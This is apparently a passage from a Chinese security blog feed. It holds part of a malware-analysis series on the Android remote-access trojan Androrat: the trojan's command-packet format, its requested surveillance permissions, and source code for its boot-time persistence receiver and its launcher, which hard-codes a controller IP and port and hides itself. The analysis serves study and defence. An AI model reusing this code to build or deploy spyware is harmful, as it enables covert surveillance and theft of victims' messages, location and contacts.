&lt;p&gt;按照上面分析代码的过程，我们可以把指令切割为如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;totalLength  :00 00 00 07  ==》总共长度，如果分片传递则大于localLength
localLength  :00 00 00 07  ==》本包长度
lst          :01           ==》是否为最后一个包
NumSeq       :00 00        ==》如果是分片，则表示此包为第几个数据包
channel      :00 00 00 00  ==》服务端所使用的频道
commande     :00 07        ==》命令
targetChannel:00 00 03 8f  ==》返回数据发送到的频道
argument     :2f           ==》执行命令所用到的参数
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;至于commande（作者拼错了吧？）中各个数值，大家可以到Protocol.java文件中去看，内容太长，我就不在这里贴了。&lt;/p&gt;

&lt;h2 id=&quot;0x03-总结&quot;&gt;0x03 总结&lt;/h2&gt;

&lt;p&gt;关于Androrat木马客户端接受服务端指令的过程，我们已经分析完了。除了客户端如何构造数据包，将信息发送至服务端这个功能还值得一说，其他的代码就没什么要说的必要了。下篇文章我打算把构造向服务端发送数据包的代码分析一下，然后再整体的对这个木马的结构进行一下分析，画一下结构图什么的。&lt;/p&gt;

&lt;p&gt;至于其他功能性的代码，其实和正常的Android软件开发没什么区别。如果感兴趣，建议大家去看上篇文章提到的那个教程。如果有时间，我也可能会翻译过来。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;从我分析的这个算是比较流行的木马情况来看，恶意软件还是处于刚刚开始的阶段，代码实现方向还是以基础功能性为主，对抗相关的内容很少，或者说是几乎没有。&lt;/strong&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>剖析安卓木马Androrat（一）</title>
   <link href="http://localhost:4000/%E6%8A%80%E6%9C%AF/2017/04/09/%E5%89%96%E6%9E%90%E5%AE%89%E5%8D%93%E6%9C%A8%E9%A9%ACAndrorat-%E4%B8%80.html"/>
   <updated>2017-04-09T02:04:34+08:00</updated>
   <id>http://localhost:4000/%E6%8A%80%E6%9C%AF/2017/04/09/剖析安卓木马Androrat（一）</id>
   <content type="html">&lt;h2 id=&quot;0x00-前言&quot;&gt;0x00 前言&lt;/h2&gt;

&lt;p&gt;很久远写的一个系列的文章了，本来遗忘在硬盘的某个角落的。直到前两周有个小朋友发邮件问我这个系列的后两篇在哪里，才知道自己的文章还是可以帮助到一些人的，所以从硬盘扒了出来，放到&lt;a href=&quot;www.tang3.org&quot;&gt;奇门遁甲&lt;/a&gt;上，供各位视奸~&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;之前有一个想法，想通过学习Android木马的编写来了解Android程序的编写，刚好看到了Bincker给的一个&lt;a href=&quot;http://blog.csdn.net/bincker/article/details/40833339&quot;&gt;《安卓木马编写教程》&lt;/a&gt;。刚照着教程写完了一个入门程序，就无意间在WooYun上发现了Androrat的这个木马，看上去功能挺强大的，就决定来看一看它都是怎么实现各种功能的。&lt;/p&gt;

&lt;p&gt;这篇文章对于我整个分析过程的重新整理，一方面为了给自己做个记录，另一方面给想要涉及Android领域的同学先抛一块砖垫脚。&lt;/p&gt;

&lt;h2 id=&quot;0x01-androidmanifest分析&quot;&gt;0x01 AndroidManifest分析&lt;/h2&gt;

&lt;p&gt;国际惯例，我们先来看AndroidManifest.xml中提供的信息。先来看权限：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2017-04/permission.png&quot; alt=&quot;permission&quot; /&gt;&lt;/p&gt;

&lt;p&gt;可以看到申请了以下这些权限（Android权限信息请参考&lt;a href=&quot;(http://developer.android.com/reference/android/Manifest.permission.html)&quot;&gt;这里&lt;/a&gt;)：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;短信提醒接收&lt;/li&gt;
  &lt;li&gt;读、发短信&lt;/li&gt;
  &lt;li&gt;获取手机状态&lt;/li&gt;
  &lt;li&gt;处理拨出电话&lt;/li&gt;
  &lt;li&gt;获取网络状态&lt;/li&gt;
  &lt;li&gt;获取精确定位&lt;/li&gt;
  &lt;li&gt;连接网络&lt;/li&gt;
  &lt;li&gt;录音&lt;/li&gt;
  &lt;li&gt;扩展存储（SD卡）写&lt;/li&gt;
  &lt;li&gt;相机&lt;/li&gt;
  &lt;li&gt;开机启动&lt;/li&gt;
  &lt;li&gt;拨打电话&lt;/li&gt;
  &lt;li&gt;获取通讯录&lt;/li&gt;
  &lt;li&gt;震动&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;从申请的这些权限，我们不难猜到这个木马所能够实现的功能。下面我们继续来看AndroidManfest中application中定义的模块：有两个receiver，一个开机启动监听，一个没有定义action；两个activity，一个主界面，一个看名字貌似和照片相关的界面；一个service，木马的主服务。具体定义内容如下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2017-04/application.png&quot; alt=&quot;application&quot; /&gt;&lt;/p&gt;

&lt;p&gt;从上面这些内容来看,我们分析的入手点有两个，一个是开机启动的那个处理，另一个就是主界面，下面我们挨个来看一看它们都做了什么。&lt;/p&gt;

&lt;h2 id=&quot;0x02-开机启动处理过程分析&quot;&gt;0x02 开机启动处理过程分析&lt;/h2&gt;

&lt;p&gt;代码如下：&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;BootReceiver&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BroadcastReceiver&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
	
	&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TAG&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BootReceiver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getSimpleName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
	
	&lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;onReceive&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Context&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Intent&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;intent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;Log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TAG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;BOOT Complete received by Client !&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
		
		&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;action&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;intent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAction&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
		
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;equals&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Intent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;ACTION_BOOT_COMPLETED&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//android.intent.action.BOOT_COMPLETED&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;Intent&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serviceIntent&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Intent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;serviceIntent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setAction&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BootReceiver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getSimpleName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;startService&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serviceIntent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;代码很简单，判断action是不是开机启动的action，如果是就初始化一个启动Client的Intent，设置这个Intent的action为当前类名（这一步的作用只是为了让Client在log中打印是哪个应用开启了服务，应该是为了方便调试），最后启动Client服务，说白了就是是做了一个Client服务的启动（关于Client的实现，我会作为正餐在后面给出详细的分析）。&lt;/p&gt;

&lt;h2 id=&quot;0x03-主界面处理过程分析&quot;&gt;0x03 主界面处理过程分析&lt;/h2&gt;

&lt;p&gt;还是先看代码：&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;LauncherActivity&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Activity&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/** Called when the activity is first created. */&lt;/span&gt;
	
	&lt;span class=&quot;n&quot;&gt;Intent&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ClientAlt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;Button&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;btnStart&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;btnStop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;EditText&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipfield&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;portfield&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;onCreate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Bundle&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;savedInstanceState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;super&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;onCreate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;savedInstanceState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;setContentView&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;layout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        
        &lt;span class=&quot;n&quot;&gt;Client&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Intent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;Client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setAction&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LauncherActivity&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
        
        &lt;span class=&quot;n&quot;&gt;btnStart&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Button&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;findViewById&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;buttonstart&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;btnStop&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Button&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;findViewById&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;buttonstop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
       &lt;span class=&quot;c1&quot;&gt;// ipfield = (EditText) findViewById(R.id.ipfield);&lt;/span&gt;
       &lt;span class=&quot;c1&quot;&gt;// portfield = (EditText) findViewById(R.id.portfield);&lt;/span&gt;
        
        &lt;span class=&quot;n&quot;&gt;btnStart&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setOnClickListener&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;View&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;OnClickListener&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;onClick&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;View&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;view&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            	&lt;span class=&quot;n&quot;&gt;Client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;putExtra&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;IP&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipfield&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getText&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
            	&lt;span class=&quot;n&quot;&gt;Client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;putExtra&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;PORT&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Integer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;portfield&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getText&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()));&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;startService&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;btnStart&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setEnabled&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;btnStop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setEnabled&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
             
                
                &lt;span class=&quot;c1&quot;&gt;//finish();                &lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;});&lt;/span&gt;
        
		
		&lt;span class=&quot;n&quot;&gt;Client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;putExtra&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;IP&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;172.16.1.60&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;Client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;putExtra&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;PORT&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7777&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;c1&quot;&gt;//  Client.putExtra(&quot;IP&quot;, ipfield.getText().toString());&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;//	Client.putExtra(&quot;PORT&quot;, new Integer(portfield.getText().toString()));&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;startService&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;btnStart&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setEnabled&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;btnStop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setEnabled&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;moveTaskToBack&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;启动服务&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;




        
        &lt;span class=&quot;n&quot;&gt;btnStop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setOnClickListener&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;View&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;OnClickListener&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;onClick&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;View&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;view&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;             
                &lt;span class=&quot;n&quot;&gt;stopService&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  
                &lt;span class=&quot;n&quot;&gt;btnStart&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setEnabled&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;btnStop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setEnabled&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;c1&quot;&gt;//finish(); &lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;});&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;先定义一个调用Client的Intent，设置action。后面的代码创建了一个Start和Stop按钮，Start按钮从ipfield和portfield中抽取ip和port，添加到Intent携带的数据中（在Client设定连接到的服务端信息），然后启动Client服务，禁用Start按钮，开启Stop按钮。Stop按钮的实现写在了最后，停止Client服务，然后打开Start按钮，禁用Stop按钮。不过不知道作者怎么想的，把ipfield和portfield禁用掉了，所以这个功能就一直都是废掉的。如果想要使用它们，可以修改代码中对于ipfield和portfiled的注释部分，在界面这设计中添加id为ipfield和portfield的输入框。&lt;/p&gt;

&lt;p&gt;我的代码是从《如何玩转andriod远控（androrat）》作者提供的网盘上下载的，在Androrat项目的GitHub项目里没有看关于界面的代码，应该是这篇文章作者用做文章的示例代码。&lt;/p&gt;

&lt;p&gt;这里有一点小的八卦信息，GitHub上面搜索Androrat，从返回的和这个项目相关的内容中可以看出原作者是一个叫RobinDavid的法国人（注释中满满的全是看不懂的鸟文o(╯□╰)o），但是我在作者自己的GitHub中没有找到这个项目，而且这个项目应该是作者在2012年11月开发的，至于原因什么的各位看官自己去联想吧。&lt;/p&gt;

&lt;p&gt;这个项目目前在GitHub上Wooyun的wszf（猥琐zf？）在维护，我看了下历史更新，貌似改动挺大。还有一个是一个国外的人fork的，没有什么改动，原汁原味的，大家喜欢哪个就去下哪个吧，链接如下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/wszf/androrat/tree/master/src/AndroratServer/inout&quot;&gt;wszf的androrat&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/DesignativeDave/androrat&quot;&gt;原版的androrat&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;0x04-核心client类分析&quot;&gt;0x04 核心Client类分析&lt;/h2&gt;

&lt;p&gt;每当一个服务建立后，都会由系统调用它们的onCreate方法，所以我们先来看Client的OnCreate方法的代码：&lt;/p&gt;

